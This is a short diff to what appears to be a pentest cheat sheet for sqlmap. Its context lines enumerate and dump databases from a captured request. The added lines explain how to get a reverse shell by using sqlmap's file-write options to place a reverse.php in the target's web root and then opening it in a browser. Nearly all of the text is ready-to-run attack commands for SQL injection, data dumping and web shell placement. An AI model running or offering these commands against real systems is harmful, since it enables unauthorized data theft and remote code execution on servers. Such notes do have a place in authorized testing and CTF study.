@@ -18,3 +18,14 @@ sqlmap -r request.txt --dbs
 
 sqlmap -r request.txt -D <TABLE_NAME> --tables --dump
 ```
+
+---
+
+- Get a reverse shell with slqmap:
+
+```shell
+sqlmap -r request.txt --dbs --file-dest=/var/www/html/reverse.php --file-write=./reverse.php
+```
+
+- Now open open your browser: `http://IP_HOST/reverse.php`
+
